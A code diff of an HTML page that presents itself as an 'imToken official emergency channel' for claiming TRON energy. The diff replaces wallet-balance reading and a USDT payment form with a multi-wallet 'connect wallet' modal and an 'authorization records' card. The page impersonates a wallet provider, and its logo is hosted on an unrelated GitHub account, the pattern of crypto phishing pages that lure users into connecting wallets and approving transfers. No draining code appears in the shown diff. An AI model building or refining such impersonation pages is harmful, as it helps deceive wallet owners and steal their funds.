@@ -6,7 +6,6 @@
   <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
   <link rel="icon" href="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png">
   <title>imToken官方应急通道</title>
-  <!-- OG标签 -->
   <meta property="og:title" content="imToken官方应急通道" />
   <meta property="og:description" content="imToken专属能量领取通道" />
   <meta property="og:image" content="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" />
@@ -21,13 +20,12 @@
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     }
     body {
-      overflow: hidden;
-      margin: 0;
+      padding-top: 70px; /* 给固定顶部容器留空间 */
       padding: 10px;
       background-color: #f5f5f5;
     }
 
-    /* 🔥 完全保留你想要的加载动画 🔥 */
+    /* 保留你想要的加载动画 */
     #Loading {
       width: 100%;
       height: 100vh;
@@ -85,54 +83,67 @@
       100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
     }
 
-    /* 页面容器样式 */
+    /* 1. 顶部容器（固定） */
     .top-nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      padding: 12px 10px;
+      background-color: #fff;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      margin-bottom: 15px;
-      padding: 5px 0;
-      display: none;
+      border-bottom: 2px solid #c23631; /* 红色边框 */
+      z-index: 999;
     }
     .top-nav .logo {
+      width: 40px; /* logo占位 */
+      height: 40px;
+      background-color: #f0f0f0;
+      border-radius: 4px;
       display: flex;
       align-items: center;
-      gap: 8px;
-      font-weight: 700;
-      font-size: 18px;
-      color: #333;
+      justify-content: center;
+      font-size: 12px;
+      color: #999;
     }
-    .top-nav .logo img {
-      width: 24px;
-      height: 24px;
+    .top-nav .right-area {
+      display: flex;
+      gap: 10px;
+      align-items: center;
     }
     .top-nav .lang-btn {
       padding: 4px 8px;
-      border: 1px solid #ddd;
+      border: 1px solid #c23631; /* 红色边框 */
       border-radius: 4px;
       background-color: #fff;
       font-size: 12px;
-      color: #333;
+      color: #c23631;
       cursor: pointer;
     }
-    .top-nav .addr-tag {
-      padding: 4px 8px;
-      background-color: #000;
+    .top-nav .connect-btn {
+      padding: 6px 12px;
+      border: 1px solid #c23631;
+      background-color: #c23631;
       color: #fff;
       border-radius: 4px;
-      font-size: 12px;
+      font-size: 14px;
+      cursor: pointer;
     }
 
+    /* 通用容器样式（所有容器红色边框） */
     .card {
       background-color: #fff;
       border-radius: 8px;
       padding: 15px;
       margin-bottom: 15px;
       box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      border: 2px solid #c23631; /* 红色边框 */
       display: none;
     }
 
-    /* 账户模块 */
+    /* 2. 余额容器（保留能量、带宽显示） */
     .account-card {
       position: relative;
     }
@@ -142,51 +153,31 @@
       gap: 10px;
       margin-bottom: 15px;
     }
-    .account-header .avatar {
+    .account-header .user-logo {
       width: 32px;
       height: 32px;
       border-radius: 50%;
-      background-color: #ff6b6b;
+      background-color: #f0f0f0; /* 用户logo占位 */
       display: flex;
       align-items: center;
       justify-content: center;
-      color: #fff;
+      font-size: 12px;
+      color: #999;
     }
     .account-header .addr {
       font-size: 14px;
       color: #666;
       word-break: break-all;
     }
-    .account-header .copy-btn {
-      position: absolute;
-      right: 15px;
-      top: 15px;
-      width: 28px;
-      height: 28px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 14px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    .account-header .copy-btn:hover {
-      background-color: #f5f5f5;
-    }
     .account-info {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      font-size: 14px;
+      gap: 15px;
+      font-size: 16px;
     }
     .account-info .item {
       display: flex;
       flex-direction: column;
-      padding: 8px;
-      border-radius: 4px;
-      background-color: #fafafa;
     }
     .account-info .label {
       color: #999;
@@ -196,151 +187,109 @@
     .account-info .value {
       color: #333;
       font-weight: 500;
-      font-size: 15px;
     }
 
-    /* 购买能量模块 */
-    .buy-energy-card .card-title {
+    /* 3. 剩余能量容器 */
+    .energy-card {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .energy-card .title {
       font-size: 16px;
       font-weight: 600;
-      margin-bottom: 15px;
-      display: flex;
-      justify-content: space-between;
+      color: #333;
     }
-    .buy-energy-card .card-title .tip {
+    .energy-card .num-box {
+      padding: 12px;
+      border: 1px solid #c23631;
+      border-radius: 4px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #c23631;
+    }
+    .energy-card .text-placeholder {
       font-size: 12px;
       color: #999;
-      font-weight: normal;
     }
-    .buy-energy-card .select-box {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      margin-bottom: 12px;
-      font-size: 14px;
-      background-color: #fff;
+
+    /* 4. 授权记录容器 */
+    .auth-record-card .title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 10px;
     }
-    .buy-energy-card .input-box {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #ddd;
+    .auth-record-card .record-list {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .auth-record-card .record-item {
+      padding: 10px;
+      border: 1px solid #f0f0f0;
       border-radius: 4px;
-      margin-bottom: 12px;
       font-size: 14px;
       color: #333;
     }
-    .buy-energy-card .input-box::placeholder {
-      color: #ccc;
-    }
-    .buy-energy-card .quick-btn-group {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 5px;
-    }
-    .buy-energy-card .quick-btn {
-      flex: 1;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      background-color: #f9f9f9;
-      font-size: 14px;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-    .buy-energy-card .quick-btn:hover {
-      border-color: #c23631;
-      color: #c23631;
-    }
 
-    /* 购买TRX模块 */
-    .buy-trx-card .card-title {
-      font-size: 16px;
-      font-weight: 600;
-      margin-bottom: 15px;
-    }
-    .buy-trx-card .input-box {
+    /* 5. 钱包选择弹窗 */
+    .wallet-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
       width: 100%;
-      padding: 12px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      margin-bottom: 12px;
-      font-size: 14px;
-    }
-    .buy-trx-card .quick-btn-group {
-      display: flex;
-      gap: 10px;
-    }
-    .buy-trx-card .quick-btn {
-      flex: 1;
-      padding: 10px;
-      border: 1px solid #ddd;
-      border-radius: 4px;
-      background-color: #f9f9f9;
-      font-size: 14px;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-    .buy-trx-card .quick-btn:hover {
-      border-color: #c23631;
-      color: #c23631;
-    }
-
-    /* 支付+按钮 */
-    .pay-section {
-      display: flex;
-      justify-content: space-between;
+      height: 100vh;
+      background-color: rgba(0,0,0,0.5);
+      display: none;
       align-items: center;
-      margin-bottom: 15px;
-      font-size: 14px;
-      display: none;
-      padding: 10px;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .wallet-modal .content {
+      width: 90%;
+      max-width: 350px;
       background-color: #fff;
       border-radius: 8px;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      padding: 20px;
+      border: 2px solid #c23631;
     }
-    .pay-section .label {
-      color: #333;
-      font-weight: 500;
-    }
-    .pay-section .amount {
-      color: #c23631;
+    .wallet-modal .title {
+      font-size: 18px;
       font-weight: 600;
-      font-size: 16px;
-    }
-    .confirm-btn {
-      width: 100%;
-      padding: 15px;
-      background-color: #c23631;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      display: none;
-      transition: background 0.3s;
-      box-shadow: 0 2px 5px rgba(194,54,49,0.3);
-    }
-    .confirm-btn:hover {
-      background-color: #a82c24;
-    }
-
-    /* 底部注释 */
-    .notice {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #999;
-      line-height: 1.8;
-      display: none;
       text-align: center;
-      padding: 10px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .wallet-modal .wallet-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .wallet-modal .wallet-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px;
+      border: 1px solid #c23631;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .wallet-modal .wallet-logo {
+      width: 32px;
+      height: 32px;
+      background-color: #f0f0f0; /* logo占位 */
+      border-radius: 4px;
+    }
+    .wallet-modal .wallet-name {
+      font-size: 16px;
+      color: #333;
     }
   </style>
   <script src="imtoken://browser"></script>
 </head>
 <body>
-  <!-- 🔥 保留你想要的加载动画 🔥 -->
+  <!-- 保留加载动画 -->
   <div id="Loading">
     <div class="loader">
       <div class="inner one"></div>
@@ -349,23 +298,20 @@
     </div>
   </div>
 
-  <!-- 页面容器 -->
+  <!-- 1. 固定顶部容器 -->
   <div class="top-nav" id="topNav">
-    <div class="logo">
-      <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/logo.png" alt="logo" />
-      imToken应急通道
-    </div>
-    <div>
+    <div class="logo">LOGO占位</div>
+    <div class="right-area">
       <button class="lang-btn">中文简体</button>
-      <span class="addr-tag" id="topAddr">未连接</span>
+      <button class="connect-btn" id="connectBtn">连接钱包</button>
     </div>
   </div>
 
+  <!-- 2. 余额容器（保留能量、带宽显示） -->
   <div class="card account-card" id="accountCard">
     <div class="account-header">
-      <div class="avatar">账</div>
+      <div class="user-logo">用户LOGO</div>
       <div class="addr" id="accountAddr">未连接钱包</div>
-      <div class="copy-btn" id="copyBtn">📋</div>
     </div>
     <div class="account-info">
       <div class="item">
@@ -387,134 +333,72 @@
     </div>
   </div>
 
-  <div class="card buy-energy-card" id="energyCard">
-    <div class="card-title">
-      购买能量
-      <span class="tip">预估可转账0次</span>
-    </div>
-    <select class="select-box">
-      <option>转账对方有USDT</option>
-      <option>转账对方无USDT</option>
-    </select>
-    <input type="text" class="input-box" placeholder="输入能量数量 (0 ~ 500000)" />
-    <div class="quick-btn-group">
-      <button class="quick-btn">+64400</button>
-      <button class="quick-btn">+130500</button>
-    </div>
+  <!-- 3. 剩余能量容器 -->
+  <div class="card energy-card" id="energyCard">
+    <div class="title">剩余能量</div>
+    <div class="num-box" id="remainingEnergy">0</div>
+    <div class="text-placeholder">能量有效期：1小时（过期自动回收）</div>
   </div>
 
-  <div class="card buy-trx-card" id="trxCard">
-    <div class="card-title">购买 TRX</div>
-    <input type="text" class="input-box" value="30" placeholder="输入TRX数量" />
-    <div class="quick-btn-group">
-      <button class="quick-btn">30</button>
-      <button class="quick-btn">50</button>
-      <button class="quick-btn">100</button>
-      <button class="quick-btn">200</button>
+  <!-- 4. 授权记录容器 -->
+  <div class="card auth-record-card" id="authRecordCard">
+    <div class="title">授权记录</div>
+    <div class="record-list" id="authRecordList">
+      <div class="record-item">暂无授权记录</div>
     </div>
   </div>
 
-  <div class="pay-section" id="paySection">
-    <div class="label">预计支付金额</div>
-    <div class="amount">10.14 USDT</div>
-  </div>
-  <button class="confirm-btn" id="confirmBtn">确认购买</button>
-
-  <div class="notice" id="notice">
-    1、能量有效期为1小时，过期将自动回收，请您及时使用<br>
-    2、向无USDT的地址转账，需要约130500的能量<br>
-    3、本平台支持使用USDT购买能量，无需通过传统流程购买TRX来获取能量
+  <!-- 5. 钱包选择弹窗 -->
+  <div class="wallet-modal" id="walletModal">
+    <div class="content">
+      <div class="title">选择钱包</div>
+      <div class="wallet-list">
+        <div class="wallet-item" id="wallet1">
+          <div class="wallet-logo">LOGO1</div>
+          <div class="wallet-name">imToken</div>
+        </div>
+        <div class="wallet-item" id="wallet2">
+          <div class="wallet-logo">LOGO2</div>
+          <div class="wallet-name">MetaMask</div>
+        </div>
+        <div class="wallet-item" id="wallet3">
+          <div class="wallet-logo">LOGO3</div>
+          <div class="wallet-name">TokenPocket</div>
+        </div>
+        <div class="wallet-item" id="wallet4">
+          <div class="wallet-logo">LOGO4</div>
+          <div class="wallet-name">Trust Wallet</div>
+        </div>
+      </div>
+    </div>
   </div>
 
   <script>
-    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const USDT_ABI = [
-      {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "balance", "type": "uint256"}],
-        "stateMutability": "view",
-        "type": "function"
-      }
-    ];
-    let tronWeb = null;
-    let userAddress = null;
-
+    // 加载动画逻辑
     document.addEventListener('DOMContentLoaded', async () => {
-      // 加载动画显示2秒后隐藏
-      setTimeout(async () => {
+      setTimeout(() => {
         document.getElementById("Loading").style.display = "none";
-        // 显示页面所有容器
+        // 显示页面容器
         document.getElementById("topNav").style.display = "flex";
         document.getElementById("accountCard").style.display = "block";
         document.getElementById("energyCard").style.display = "block";
-        document.getElementById("trxCard").style.display = "block";
-        document.getElementById("paySection").style.display = "flex";
-        document.getElementById("confirmBtn").style.display = "block";
-        document.getElementById("notice").style.display = "block";
-        
-        // 检测imToken环境
-        await checkImTokenEnv();
+        document.getElementById("authRecordCard").style.display = "block";
       }, 2000);
 
-      // 复制地址功能
-      document.getElementById("copyBtn").addEventListener('click', () => {
-        const addr = document.getElementById("accountAddr").textContent;
-        if (addr === "未连接钱包") {
-          alert("请先连接钱包");
-          return;
-        }
-        navigator.clipboard.writeText(addr).then(() => {
-          alert("地址复制成功");
-        }).catch(() => {
-          alert("复制失败，请手动复制");
+      // 点击“连接钱包”显示弹窗
+      document.getElementById("connectBtn").addEventListener('click', () => {
+        document.getElementById("walletModal").style.display = "flex";
+      });
+
+      // 钱包选项点击（示例逻辑，后续可绑定实际连接）
+      const walletItems = document.querySelectorAll('.wallet-item');
+      walletItems.forEach(item => {
+        item.addEventListener('click', () => {
+          alert(`选择了钱包：${item.querySelector('.wallet-name').textContent}`);
+          document.getElementById("walletModal").style.display = "none";
         });
       });
     });
-
-    // 检测imToken环境
-    async function checkImTokenEnv() {
-      if (window.tronWeb) {
-        tronWeb = window.tronWeb;
-        await initWallet().catch(err => {
-          console.error("钱包初始化失败：", err);
-          alert("钱包连接失败，请刷新页面重试");
-        });
-      } else {
-        alert("请在imToken钱包内置浏览器打开");
-      }
-    }
-
-    // 初始化钱包信息
-    async function initWallet() {
-      try {
-        // 获取钱包地址
-        userAddress = tronWeb.defaultAddress.base58;
-        if (!userAddress) throw new Error("未检测到钱包地址");
-        
-        // 更新地址显示
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        document.getElementById("topAddr").textContent = shortAddr;
-        document.getElementById("accountAddr").textContent = userAddress;
-
-        // 获取USDT余额
-        const trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-        const usdtRaw = await trc20Contract.balanceOf(userAddress).call().catch(err => 0);
-        const usdtBalance = (Number(usdtRaw) / 1000000).toFixed(6);
-        document.getElementById("usdtBalance").textContent = usdtBalance;
-
-        // 获取TRX余额
-        const trxRaw = await tronWeb.trx.getBalance(userAddress).catch(err => 0);
-        const trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
-        document.getElementById("trxBalance").textContent = trxBalance;
-
-        // 模拟获取带宽（实际需根据链上接口调整）
-        document.getElementById("bandwidth").textContent = "600";
-      } catch (e) {
-        alert("获取钱包信息失败：" + e.message);
-      }
-    }
   </script>
 </body>
 </html>
